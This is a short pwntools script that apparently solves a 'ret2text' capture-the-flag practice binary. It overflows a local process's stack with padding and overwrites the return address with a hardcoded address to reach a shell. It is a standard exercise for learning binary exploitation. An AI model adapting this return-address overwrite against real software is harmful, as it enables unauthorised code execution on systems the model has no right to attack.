from pwn import *

system_addr=0x0804863a
eax=0xffffcfdc
ebp=0xffffd048
offset=ebp-eax+4
sh=process("./ret2text")
sh.sendline(b'A'*offset+p32(system_addr))
sh.interactive()

